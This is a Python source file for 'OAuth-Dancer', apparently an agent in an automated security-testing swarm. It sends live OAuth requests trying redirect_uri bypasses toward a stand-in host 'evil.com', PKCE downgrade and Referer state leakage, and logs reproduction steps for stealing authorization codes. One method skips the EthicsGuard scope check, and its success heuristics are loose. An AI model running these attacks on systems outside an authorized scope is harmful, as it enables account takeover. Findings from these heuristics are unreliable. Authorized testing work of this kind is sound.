"""
OAuth-Dancer: OAuth/OIDC認証バイパス専門エージェント

Extracted from auth_ninja.py to keep the swarm module modular.
"""

from typing import Optional
import logging

from src.core.security.ethics_guard import (
    get_ethics_guard,
    ActionType,
    ActionResult,
)
from src.core.models.finding import Finding, Evidence, Severity, VulnType

from src.tools.builtin.handoff import (
    HandoffContext,
    HandoffResult,
    HandoffStatus,
    create_handoff_result,
)
from src.core.engine.agent_registry import register_agent
from src.core.agents.base import AgentConfig

from .auth_ninja_base import BaseAuthAgent

from src.core.utils.asset_loader import asset_loader


logger = logging.getLogger(__name__)


@register_agent(
    names=["oauthdancer", "oauth"],
    tags=["web", "auth", "all"]
)
class OAuthDancer(BaseAuthAgent):
    """
    OAuth-Dancer: OAuth/OIDC認証バイパス専門
    
    攻撃手法:
    - Redirect URI Bypass: オープンリダイレクト経由
    - PKCE Downgrade: code_verifier省略
    - State Leakage: CSRF経由のstate窃取
    - Token Theft via Referrer: Refererヘッダー経由の漏洩
    
    RAG連携: Obsidianノートからバイパスパターンを取得
    EthicsGuard連携: スコープ内のみリクエスト送信
    """
    
    def __init__(self, config: AgentConfig = None, workspace_root: Optional[str] = None, rag_switch=None, program_name: str = ""):
        if config is None:
            config = AgentConfig(
                name="OAuth-Dancer",
                description="OAuth/OIDC authentication bypass specialist agent",
                model="default",
                instructions="Execute OAuth bypass attacks"
            )
        super().__init__(config, workspace_root=workspace_root)
        
        # Note: self.name is inherited from BaseAgent (property accessing config.name)
        self._rag_switch = rag_switch
        self._guard = get_ethics_guard()
        self._program_name = program_name
        self._payloads = None

    @property
    def payloads(self):
        if self._payloads is None:
             self._payloads = asset_loader.load_yaml("auth_payloads.yaml").get("oauth_dancer", {})
        return self._payloads

    @property
    def STR_REDIRECT_BYPASS_PATTERNS(self):
         return self.payloads.get("redirect_bypass_patterns", [])
    
    def set_rag_switch(self, rag_switch) -> None:
        """RAGSwitchを設定"""
        self._rag_switch = rag_switch
    
    async def execute(self, context: Optional[HandoffContext] = None, **kwargs) -> HandoffResult:
        """
        OAuth認証バイパスを試行
        
        Required metadata:
        - authorize_url: 認可エンドポイント
        - client_id: OAuthクライアントID
        - legitimate_redirect: 正規のredirect_uri
        - evil_redirect: 攻撃者のredirect_uri
        """
        if context is None:
            # 互換性レイヤー: kwargs から HandoffContext を生成
            target = kwargs.get("target", "")
            params = kwargs.get("params", {})
            context = HandoffContext.from_params({"target": target, **params})
            
        target = context.target_url
        params = context.metadata
        
        # 初期結果
        result = create_handoff_result(
            agent_name=self.name,
            status="failed",
            target_url=target,
        )
        
        # EthicsGuard: スコープチェック
        is_allowed, reason = self._guard.check_action(ActionType.HTTP_REQUEST, target)
        if is_allowed != ActionResult.ALLOWED:
            result.status = HandoffStatus.BLOCKED
            result.error = reason
            return result
        
        methods = [
            ("redirect_bypass", VulnType.OAUTH_REDIRECT_BYPASS, self._try_redirect_bypass),
            ("pkce_downgrade", VulnType.OAUTH_PKCE_BYPASS, self._try_pkce_downgrade),
            ("state_leakage", VulnType.BROKEN_ACCESS_CONTROL, self._try_state_leakage),
        ]
        
        for method_name, vuln_type, method_func in methods:
            attack_result = await method_func(target, params)
            if attack_result.get("success"):
                finding = self._create_finding(
                    target=target,
                    method_name=method_name,
                    vuln_type=vuln_type,
                    result=attack_result,
                    params=params,
                )
                
                result.status = HandoffStatus.SUCCESS
                result.bypass_method = method_name
                result.credentials = attack_result.get("credentials", {})
                result.recommendations = [
                    f"OAuth bypass succeeded via {method_name}",
                    "Verify scope of obtained access token",
                ]
                result.success_probability = 0.75
                result.response_data = attack_result.get("details", {})
                result.findings = [finding.to_dict()] if finding else []
                result.vulnerability_hypothesis = f"OAuth {method_name} vulnerability confirmed"
                
                self.log_attempt(target, method_name, True)
                
                # 共有ワークスペースに保存
                if finding:
                    await self.save_finding(finding.to_dict())
                
                break
            else:
                self.log_attempt(target, method_name, False)
        
        return result
    
    def _create_finding(
        self,
        target: str,
        method_name: str,
        vuln_type: VulnType,
        result: dict,
        params: dict,
    ) -> Finding:
        """成功した攻撃からFindingを生成"""
        details = result.get("details", {})
        
        title_map = {
            "redirect_bypass": "OAuth Redirect URI Bypass",
            "pkce_downgrade": "OAuth PKCE Downgrade Attack",
            "state_leakage": "OAuth State Parameter Leakage",
        }
        
        return Finding(
            vuln_type=vuln_type,
            severity=Severity.HIGH,
            title=title_map.get(method_name, f"OAuth Bypass via {method_name}"),
            description=(
                f"The OAuth implementation is vulnerable to {method_name}. "
                f"An attacker can steal authorization codes or access tokens."
            ),
            target_url=target,
            target_program=self._program_name,
            evidence=Evidence(
                request_method="GET",
                request_url=result.get("vulnerable_url", target),
                response_status=result.get("response_status", 302),
            ),
            reproduction_steps=result.get("reproduction_steps", []),
            impact=(
                "An attacker can steal OAuth authorization codes or access tokens, "
                "leading to account takeover. The attacker can access user data "
                "and perform actions on behalf of the victim."
            ),
            source_agent="oauth_dancer",
            confidence=0.85,
            cwe_id="CWE-601",
            additional_info=details,
        )
    
    async def _try_redirect_bypass(self, target: str, params: dict) -> dict:
        """
        Redirect URIバイパスを試行
        
        RAGから追加のバイパスパターンを取得して動的に検証。
        """
        from urllib.parse import urlencode, urlparse, parse_qs
        
        authorize_url = params.get("authorize_url", target)
        client_id = params.get("client_id", "")
        legitimate_redirect = params.get("legitimate_redirect", "")
        evil_redirect = params.get("evil_redirect", "https://evil.com/callback")
        
        if not client_id or not legitimate_redirect:
            return {"success": False, "error": "Missing client_id or legitimate_redirect"}
        
        # RAGからバイパスパターンを取得
        bypass_patterns = self.STR_REDIRECT_BYPASS_PATTERNS.copy()
        
        if self._rag_switch and self._rag_switch.enabled:
            rag_techniques = self._rag_switch.get_bypass_techniques("oauth_redirect")
            for tech in rag_techniques:
                payload = tech.get("payload", "")
                if payload and payload not in bypass_patterns:
                    bypass_patterns.append(payload)
        
        # URLのパース
        legitimate_parsed = urlparse(legitimate_redirect)
        evil_parsed = urlparse(evil_redirect)
        
        # 動的にバイパスURIを生成
        test_redirects = []
        for pattern in bypass_patterns:
            try:
                bypass_uri = pattern.format(
                    legitimate=legitimate_redirect,
                    evil=evil_redirect,
                    legitimate_host=legitimate_parsed.netloc,
                    evil_domain=evil_parsed.netloc,
                    legitimate_domain=legitimate_parsed.netloc.split(".")[-2] + "." + legitimate_parsed.netloc.split(".")[-1] if "." in legitimate_parsed.netloc else legitimate_parsed.netloc,
                    evil_subdomain="evil",
                )
                test_redirects.append((pattern, bypass_uri))
            except (KeyError, IndexError):
                # パターンが不完全な場合はスキップ
                test_redirects.append((pattern, pattern.replace("{legitimate}", legitimate_redirect).replace("{evil}", evil_redirect)))
        
        # 各パターンでリクエストをテスト
        for pattern_name, bypass_uri in test_redirects:
            oauth_params = {
                "client_id": client_id,
                "redirect_uri": bypass_uri,
                "response_type": params.get("response_type", "code"),
                "scope": params.get("scope", "openid profile"),
                "state": "test_state_12345",
            }
            
            full_url = f"{authorize_url}?{urlencode(oauth_params)}"
            
            # EthicsGuard チェック
            is_allowed, _ = self._guard.check_action(ActionType.HTTP_REQUEST, authorize_url)
            if is_allowed != ActionResult.ALLOWED:
                continue
            
            try:
                response = await self.network_client.request(
                    method="GET",
                    url=full_url,
                    allow_redirects=False,
                    timeout=params.get("timeout", 10),
                    use_proxy=True
                )
                
                # 成功判定: 
                # 1. 302リダイレクトで、Locationに攻撃者のURIが含まれる
                # 2. 200でエラーメッセージがない
                if response.status in (301, 302, 303, 307, 308):
                    location = response.headers.get("Location", "")
                    # リダイレクト先に悪意のあるドメインが含まれるか確認
                    if evil_parsed.netloc in location or bypass_uri in location:
                        return {
                            "success": True,
                            "bypass_pattern": pattern_name,
                            "vulnerable_url": full_url,
                            "response_status": response.status,
                            "redirect_location": location,
                            "credentials": {"bypass_redirect_uri": bypass_uri},
                            "details": {
                                "pattern": pattern_name,
                                "bypass_uri": bypass_uri,
                                "rag_assisted": bool(self._rag_switch and self._rag_switch.enabled),
                            },
                            "reproduction_steps": [
                                f"1. Navigate to OAuth authorization endpoint: {authorize_url}",
                                f"2. Set redirect_uri to: {bypass_uri}",
                                f"3. Observe that the server accepts the malicious redirect_uri",
                                f"4. The authorization code will be sent to the attacker's server",
                            ],
                        }
                
                # エラーがない場合（redirect_uriが検証されていない可能性）
                if response.status == 200:
                    body = response.text.lower()
                    if not any(err in body for err in ["invalid", "error", "unauthorized", "mismatch"]):
                        return {
                            "success": True,
                            "bypass_pattern": pattern_name,
                            "vulnerable_url": full_url,
                            "response_status": response.status,
                            "credentials": {"bypass_redirect_uri": bypass_uri},
                            "details": {"pattern": pattern_name, "note": "No redirect_uri validation error"},
                            "reproduction_steps": [
                                f"1. Navigate to: {full_url}",
                                f"2. Observe no error for malicious redirect_uri",
                            ],
                        }
                        
            except Exception:
                continue
        
        return {"success": False, "error": "All redirect_uri bypass patterns failed"}
    
    async def _try_pkce_downgrade(self, target: str, params: dict) -> dict:
        """
        PKCEダウングレード攻撃
        
        code_challengeを削除した際にサーバーがどう応答するかを確認。
        PKCEが必須でない場合、認可コードを傍受できる可能性がある。
        """
        from urllib.parse import urlencode
        
        authorize_url = params.get("authorize_url", target)
        client_id = params.get("client_id", "")
        redirect_uri = params.get("legitimate_redirect", "")
        
        if not client_id or not redirect_uri:
            return {"success": False, "error": "Missing client_id or redirect_uri"}
        
        # 1. PKCEありのリクエスト
        pkce_params = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "scope": params.get("scope", "openid profile"),
            "state": "pkce_test_state",
            "code_challenge": "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM",  # テスト用
            "code_challenge_method": "S256",
        }
        
        # 2. PKCEなしのリクエスト
        no_pkce_params = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "scope": params.get("scope", "openid profile"),
            "state": "no_pkce_test_state",
        }
        
        # EthicsGuard チェック
        is_allowed, _ = self._guard.check_action(ActionType.HTTP_REQUEST, authorize_url)
        if is_allowed != ActionResult.ALLOWED:
            return {"success": False, "error": "Blocked by EthicsGuard"}
        
        try:
            # PKCEありでリクエスト
            response_with_pkce = await self.network_client.request(
                method="GET",
                url=f"{authorize_url}?{urlencode(pkce_params)}",
                allow_redirects=False,
                timeout=params.get("timeout", 10),
                use_proxy=True
            )
            
            # PKCEなしでリクエスト
            response_without_pkce = await self.network_client.request(
                method="GET",
                url=f"{authorize_url}?{urlencode(no_pkce_params)}",
                allow_redirects=False,
                timeout=params.get("timeout", 10),
                use_proxy=True
            )
            
            # 判定: PKCEなしでも正常にリダイレクトされる場合は脆弱
            # (PKCEが必須でない)
            with_pkce_ok = response_with_pkce.status in (200, 302, 303)
            without_pkce_ok = response_without_pkce.status in (200, 302, 303)
            
            # PKCEなしがエラーにならない場合
            without_pkce_error = False
            if response_without_pkce.status == 200:
                body = response_without_pkce.text.lower()
                without_pkce_error = any(err in body for err in ["code_challenge", "pkce", "required"])
            
            if without_pkce_ok and not without_pkce_error:
                return {
                    "success": True,
                    "bypass_pattern": "PKCE Downgrade",
                    "vulnerable_url": f"{authorize_url}?{urlencode(no_pkce_params)}",
                    "response_status": response_without_pkce.status,
                    "details": {
                        "with_pkce_status": response_with_pkce.status,
                        "without_pkce_status": response_without_pkce.status,
                        "pkce_required": False,
                    },
                    "reproduction_steps": [
                        f"1. Start OAuth flow without code_challenge parameter",
                        f"2. URL: {authorize_url}?{urlencode(no_pkce_params)}",
                        f"3. Observe that the server accepts the request without PKCE",
                        f"4. Authorization code can be intercepted without code_verifier",
                    ],
                }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "PKCE appears to be required"}
    
    async def _try_state_leakage(self, target: str, params: dict) -> dict:
        """State漏洩を検出"""
        from urllib.parse import urlencode
        
        authorize_url = params.get("authorize_url", target)
        client_id = params.get("client_id", "")
        redirect_uri = params.get("legitimate_redirect", "")
        
        if not client_id or not redirect_uri:
            return {"success": False, "error": "Missing client_id or redirect_uri"}
        
        # Referrerヘッダーを介したstate漏洩をテスト
        # 実装: 外部リソースへのリファラー送信をチェック
        test_state = "sensitive_state_12345"
        oauth_params = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "scope": params.get("scope", "openid"),
            "state": test_state,
        }
        
        full_url = f"{authorize_url}?{urlencode(oauth_params)}"
        
        try:
            # 認可ページを取得
            response = await self.network_client.request(
                method="GET",
                url=full_url,
                allow_redirects=False, 
                timeout=10,
                use_proxy=True
            )
            
            if response.status == 200:
                # HTMLを解析して外部リソース参照をチェック
                import re
                external_resources = re.findall(r'(?:src|href)=["\']?(https?://[^"\'>\s]+)', response.text)
                
                # state パラメータが referrer で漏洩する可能性
                # （実際には外部リソース読み込み時の Referer ヘッダーに URL 全体が含まれる）
                if external_resources:
                    # 簡易検証: 外部リソースが存在する場合、state漏洩のリスクあり
                    return {
                        "success": True,
                        "vulnerable_url": full_url,
                        "details": {
                            "external_resources_count": len(external_resources),
                            "sample_resources": external_resources[:3],
                            "risk": "State parameter may leak via Referer header",
                        },
                        "reproduction_steps": [
                            f"1. Navigate to: {full_url}",
                            f"2. Observe external resource loading (e.g., CDN, analytics)",
                            f"3. Check Referer header sent to third parties contains state parameter",
                        ],
                    }
        
        except Exception as e:
            return {"success": False, "error": f"State leakage check failed: {str(e)}"}
        
        return {"success": False, "error": "No state leakage detected"}
